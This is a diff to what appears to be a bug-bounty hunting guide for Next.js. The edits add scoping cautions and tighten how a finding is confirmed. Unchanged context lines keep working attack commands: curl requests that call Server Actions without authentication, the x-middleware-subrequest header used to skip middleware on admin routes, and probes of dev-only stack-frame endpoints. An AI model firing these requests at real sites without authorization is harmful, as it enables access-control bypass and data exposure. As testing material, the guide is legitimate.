@@ -31,6 +31,8 @@ report_count: 0
 
 # HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
 
+Historical version ranges and exploit snippets require the exact framework/router/runtime/hosting conditions from primary advisories. HTTP 200 or non-404 alone never establishes access bypass, dev mode or a vulnerability; validate content against authenticated/unauthenticated controls and intended policy. Use synthetic identities and records, bounded request budgets and an approved callback receiver. Cache poisoning, revalidation, internal metadata access and mutation require separate exact-action scope. Do not access real victim sessions/data or use discovered credentials.
+
 ## Crown Jewel Targets
 
 Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.
@@ -85,7 +87,7 @@ curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
 # Server Actions in Next.js 14+ use x-action-id or Next-Action header
 # Find action IDs in HTML source or JS bundles
 curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
-grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null
+grep -r 'createActionURL\|$$ACTION_' recon/$TARGET/ --include="*.js" 2>/dev/null
 
 # Call Server Action directly without auth
 curl -s -X POST https://$TARGET/target-page \
@@ -106,7 +108,7 @@ curl -s -X POST https://$TARGET/target-page \
 # Next.js middleware runs on edge runtime and may skip certain paths
 # Test protected route directly
 curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
-# → 200 means accessible
+# A 200 may be a login page or public shell; inspect authorized content and controls.
 
 # Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
 curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"
@@ -127,7 +129,7 @@ Next skips middleware execution entirely when this header asserts an internal su
 curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
   -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
 # also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
-# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
+# Confirm protected content/action without authorization; status alone is insufficient. Historical fixes: 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
 ```
 
 ## Phase 4 — Image Optimization SSRF (`/_next/image`)
@@ -216,11 +218,10 @@ are react-dev-overlay middleware mounted ONLY under `next dev`. A production
 build (`next build && next start`) does not register these routes — a 404 here
 is the normal, expected result, not a "filter" you need to bypass. They are
 reachable ONLY in the rare misconfiguration of literally running `next dev` in
-production. Treat any non-404 as the real finding; do NOT report a 404/filtered
-response as confirmation.
+production. Treat a non-404 as a candidate requiring version, content and route verification; a custom fallback can return 200 for every path.
 
 ```bash
-# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
+# Inspect candidate response; a non-404 does not by itself prove dev mode
 curl -s -o /dev/null -w "%{http_code}" \
   "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"
 
@@ -269,7 +270,7 @@ if m:
 
 ✅ Server Action: action executes without valid session, returns data or mutates state
 ✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
-✅ Middleware bypass: 200 response on protected route without auth cookie
+✅ Middleware bypass: unauthorized protected content/action demonstrated against controls; a 200 alone is insufficient
 ✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII
 
 **Severity:**
